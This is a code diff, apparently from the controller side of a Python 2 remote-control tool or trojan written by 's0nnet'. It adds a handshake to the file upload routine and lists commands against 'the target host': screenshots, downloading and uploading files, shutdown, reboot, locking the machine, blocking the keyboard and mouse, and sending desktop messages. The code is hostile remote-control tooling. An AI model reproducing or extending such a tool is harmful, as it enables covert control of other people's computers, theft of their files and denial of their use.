@@ -53,25 +53,28 @@ def sendFile(client_socket):
             f = open(filename,"rb")
             break
         except:
-            print "Open %s error!" % filename
+            print "[-] Cann't find %s!" % filename
             continue
 
     destPath = raw_input("To: ")
     client_socket.send(destPath)
+    check  = client_socket.recv(6)
 
-    time.sleep(1)
-    while(1):
-        data = f.read(1024)
-        print len(data)
-        if not data:
-            break
-        client_socket.sendall(data)
-    f.close()
-    time.sleep(2)
-    client_socket.sendall("EOF")
-
-    print "Send file successed!"
-
+    if check[:5] == "BEGIN":
+        time.sleep(1)
+        while(1):
+            data = f.read(1024)
+            if not data:
+                break
+            client_socket.sendall(data)
+        f.close()
+        time.sleep(0.5)
+        client_socket.sendall("EOF")
+        stat = client_socket.recv(5)
+        if stat[:4] == "RECV":
+            print "[+] Send file successed!"
+    else:
+        print "[-] Remote path doesn't exist!"
 
 
 # this is our client-handling thread
@@ -116,9 +119,10 @@ def help():
     print "\tshutdown      --shutdowm the target host after 10s."
     print "\treboot        --reboot the target host after 10s."
     print "\tcancel        --cancel shutdown or reboot."
+    print "\tkill-client   --kill the target client."
     print "\tscreenshot    --screenshot the target host."
-    print "\tdownload      --download the taeget's file."
-    print "\tupload        --upload the local's file to the target."
+    print "\tdownload      --download the taeget's file. eg: C:\Users\\admin\\a.txt"
+    print "\tupload        --upload the local's file to the target. eg: File: 1.txt To:C:\\a.txt"
     print "\tlock          --lock the target host."
     print "\tmouse         --move the mouse the the location of (0,0)."
     print "\tblockinput    --lock the target's keyboard and mouse in 5s."
@@ -126,7 +130,7 @@ def help():
     print "\t@some message   --send a message to the target's desktop."
     print "Author: s0nnet"
     print "Email: s0nnet@qq.com"
-    print "Update: 2015/6/24"
+    print "Update: 2015/6/26"
     print "======================================================================"
     
 
